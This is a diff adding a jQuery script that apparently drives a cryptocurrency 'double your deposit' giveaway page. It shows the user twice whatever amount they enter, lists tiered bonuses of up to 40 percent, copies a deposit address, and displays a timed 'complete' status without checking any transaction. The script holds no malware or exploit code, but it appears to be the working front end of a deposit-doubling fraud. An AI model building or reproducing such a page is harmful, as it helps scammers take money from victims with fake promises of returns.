@@ -1,0 +1,187 @@
+const senVal = $('.send-val').attr('value')
+
+let allowed = false
+
+$('.send-val').on('input', function (e) {
+	let sendv = e.target.value
+	$('.get-val').val(sendv * 2)
+})
+
+const intl = Intl.NumberFormat('en-US')
+const formatter = (value) => intl.format(value)
+
+jQuery(($) => {
+	$('.list-qui-value').on('click', '.item', function () {
+		const valQ = parseInt($(this).children('.val-sum').text())
+		console.log(formatter(valQ))
+		$('.send-val').val(valQ)
+		$('.get-val').val(valQ * 2)
+
+		if (valQ < 500000000) {
+			$('.bonus-per').text(0)
+		} else if (valQ >= 500000000 && valQ < 1000000000) {
+			$('.bonus-per').text(formatter(valQ * 0.1))
+		} else if (valQ >= 1000000000 && valQ < 2000000000) {
+			$('.bonus-per').text(formatter(valQ * 0.15))
+		} else if (valQ >= 2000000000 && valQ < 5000000000) {
+			$('.bonus-per').text(formatter(valQ * 0.2))
+		} else if (valQ >= 5000000000 && valQ < 10000000000) {
+			$('.bonus-per').text(formatter(valQ * 0.3))
+		} else if (valQ >= 10000000000) {
+			$('.bonus-per').text(formatter(valQ * 0.4))
+		}
+	})
+})
+
+$('.copy-adress').click(function () {
+	$('.adress-copy').fadeIn()
+	setTimeout(hidealert, 2000)
+})
+
+function copyToClipboards(elem) {
+	// create hidden text element, if it doesn't already exist
+	var targetId = '_hiddenCopyText_'
+	var isInput = elem.tagName === 'INPUT' || elem.tagName === 'TEXTAREA'
+	var origSelectionStart, origSelectionEnd
+	if (isInput) {
+		// can just use the original source element for the selection and copy
+		target = elem
+		origSelectionStart = elem.selectionStart
+		origSelectionEnd = elem.selectionEnd
+	} else {
+		// must use a temporary form element for the selection and copy
+		target = document.getElementById(targetId)
+		if (!target) {
+			var target = document.createElement('textarea')
+			target.style.position = 'absolute'
+			target.style.left = '-9999px'
+			target.style.top = '0'
+			target.id = targetId
+			document.body.appendChild(target)
+		}
+		target.textContent = elem.textContent
+	}
+	// select the content
+	var currentFocus = document.activeElement
+	target.select()
+	target.setSelectionRange(0, target.value.length)
+
+	// copy the selection
+	var succeed
+	try {
+		succeed = document.execCommand('copy')
+		$('.inp_adr').focus()
+	} catch (e) {
+		succeed = false
+	}
+	// restore original focus
+	if (currentFocus && typeof currentFocus.select === 'function') {
+		currentFocus.select()
+	}
+
+	if (isInput) {
+		// restore prior selection
+		elem.setSelectionRange(origSelectionStart, origSelectionEnd)
+	} else {
+		// clear temporary content
+		target.textContent = ''
+	}
+	return succeed
+}
+
+const hidealert = () => {
+	$('.adress-copy').fadeOut()
+}
+
+const hidestep = () => {
+	$('.next-step').fadeOut()
+}
+
+$('.error-validate').on('input', function (e) {
+	const valcount = e.target.value.length
+	if (valcount > 5) {
+		allowed = true
+
+		$('.responsive-adress-input').removeClass('error')
+		$('.validate-message').removeClass('active')
+		$('.send-type').addClass('modal-next')
+	} else {
+		allowed = false
+		$('.qr-button').attr('disabled')
+		$('.responsive-adress-input').addClass('error')
+		$('.validate-message').addClass('active')
+		$('.send-type').removeClass('modal-next')
+	}
+})
+$('.close-modal').click(function () {
+	$('.check-again').fadeOut()
+})
+
+$('.qr-button').click(function () {
+	$('.check-again').fadeIn()
+})
+
+$('.send-type').click(function () {
+	if (allowed) {
+		$('.next-step').fadeIn()
+		$('.complete-status').addClass('complete')
+		setTimeout(hidestep, 10000)
+		$('.qr-button').removeAttr('disabled')
+	}
+})
+
+$('.next-close').click(function () {
+	$('.next-step').fadeOut()
+})
+
+$('.ag-check').click(function () {
+	$('.check-again').fadeOut()
+	$('.check-again').fadeIn()
+})
+
+$('.participate').click(function (e) {
+	$('html,body').animate({ scrollTop: $('.list-qui-value').offset().top }, 'slow')
+})
+
+$('.edit').click(function () {
+	$('.error-validate').focus()
+	$('.complete-status').removeClass('complete')
+})
+
+$('.faq .item').click(function () {
+	if ($(this).hasClass('active')) {
+		$(this).find('.text').animate({ opacity: 0 }, 200)
+		//$(this).find('.text').removeClass('view');
+		setTimeout(function () {
+			//$('.faq .item.active .text').removeClass('view');
+			$('.faq .item.active .text').slideUp(500)
+			$('.faq .item.active').removeClass('active')
+		}, 300)
+	} else {
+		//$('.faq .item.active .text').removeClass('view');
+		$('.faq .item.active .text').animate({ opacity: 0 }, 100)
+		$('.faq .item.active .text').slideUp(500)
+		$('.faq .item.active').removeClass('active')
+		$(this).addClass('active')
+		$(this).find('.text').slideDown(500)
+		setTimeout(function () {
+			$('.faq .item.active .text').animate({ opacity: 1 }, 100)
+			//$('.faq .item.active .text').addClass('view');
+		}, 300)
+		//$('.faq .item').removeClass('active');
+	}
+})
+
+$(document).ready(function () {
+	$('header ul li, footer ul li').on('click', 'a', function (event) {
+		event.preventDefault()
+		var id = $(this).attr('href'),
+			top = $(id).offset().top
+		$('body,html').animate(
+			{
+				scrollTop: top,
+			},
+			1500
+		)
+	})
+})
